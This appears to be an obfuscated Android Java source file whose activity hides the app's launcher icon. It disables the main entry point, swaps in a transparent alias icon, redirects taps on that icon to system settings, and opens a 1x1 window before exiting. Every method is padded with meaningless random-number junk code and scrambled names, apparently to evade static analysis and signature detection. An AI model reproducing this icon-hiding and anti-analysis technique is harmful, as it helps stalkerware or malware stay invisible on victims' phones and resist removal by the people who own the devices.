package tnug.oetxf.oggaq;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.Gravity;
import android.view.Window;
import android.view.WindowManager;
import androidx.appcompat.app.AppCompatActivity;

/**
 * 图标隐藏辅助 Activity。
 * 启动后会禁用主入口（ZURT），并启用透明的别名入口（MysteryAliasActivity），
 * 从而在桌面上隐藏/替换应用图标。Android 10 以下可进一步禁用别名，完全移除占位图标。
 * Android 10+ 点击透明图标时跳转系统设置。
 */
public class ZURU extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        java.lang.Object arr_wHerZa = new java.lang.Object();
        int i_JeiCpyHMWcYvfbg = arr_wHerZa.hashCode();
        int j_bMNct = new java.util.Random().nextInt(100);
        int tmp_dBLplfIbe = (i_JeiCpyHMWcYvfbg ^ j_bMNct) & 0x7FFFFFFF;
        if (tmp_dBLplfIbe == 65 && i_JeiCpyHMWcYvfbg < 93) {
            arr_wHerZa.toString();
        }
        super.onCreate(savedInstanceState);
        // 别名与当前类同包，通过当前类全限定名推导包名，避免硬编码包前缀被混淆后失效
        String pkg = getClass().getName();
        pkg = pkg.substring(0, pkg.lastIndexOf('.'));
        String alias = pkg + ".MysteryAliasActivity";
        set(ZURU.this, ZURT.class.getName(), alias);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            // Android 10+ 点击透明图标后跳转系统设置
            Intent intent = new Intent(Settings.ACTION_SETTINGS);
            startActivity(intent);
        } else {
            // Android 10 以下禁用别名后，透明图标占位图也会消失
            disableComponent(ZURU.this, alias);
        }
        Window window = getWindow();
        window.setGravity(Gravity.LEFT | Gravity.TOP);
        WindowManager.LayoutParams params = window.getAttributes();
        params.x = 0;
        params.y = 0;
        params.width = 1;
        params.height = 1;
        window.setAttributes(params);
        finish();
    }

    public static void set(Context context, String main, String alias) {
        int process_xLwhaXIoCaqMJQnYts = new java.util.Random().nextInt(50);
        int stack_KtHPXjiDXsyiMxh = (process_xLwhaXIoCaqMJQnYts > 28) ? 1 : ((process_xLwhaXIoCaqMJQnYts > 94) ? 96 : ((process_xLwhaXIoCaqMJQnYts > 20) ? 9 : 76));
        int i_LYpYqMKonPuc = stack_KtHPXjiDXsyiMxh * process_xLwhaXIoCaqMJQnYts;
        if (i_LYpYqMKonPuc > 45) {
            java.lang.System.arraycopy(new int[] { i_LYpYqMKonPuc }, 0, new int[] { 0 }, 0, 1);
        }
        disableComponent(context, main);
        enableComponent(context, alias);
    }

    public static void enableComponent(Context context, String clazzName) {
        long arr_psMdJqnbHs = java.lang.System.nanoTime();
        int i_gLifKSCV = new java.util.Random().nextInt(1000);
        boolean j_fVyxcgygnu = (arr_psMdJqnbHs % (i_gLifKSCV + 26)) > 89;
        double tmp_yHDvHilclkdE = j_fVyxcgygnu ? java.lang.Math.sqrt(i_gLifKSCV) : java.lang.Math.pow(i_gLifKSCV, 44);
        if (tmp_yHDvHilclkdE < 0.0) {
            java.lang.System.out.println(tmp_yHDvHilclkdE);
        }
        ComponentName componentName = new ComponentName(context, clazzName);
        PackageManager packageManager = context.getPackageManager();
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
    }

    public static void disableComponent(Context context, String clazzName) {
        String onauNrgIbSOqcvUn = java.util.UUID.randomUUID().toString();
        int ckuyJZcgvy = onauNrgIbSOqcvUn.length();
        char pmh_ufcRu = onauNrgIbSOqcvUn.charAt(new java.util.Random().nextInt(ckuyJZcgvy));
        boolean dimaXgdMYGbZ = (pmh_ufcRu == 'z');
        if (dimaXgdMYGbZ && ckuyJZcgvy < 95) {
            onauNrgIbSOqcvUn.substring(69, 50);
        }
        ComponentName componentName = new ComponentName(context, clazzName);
        PackageManager packageManager = context.getPackageManager();
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }
}
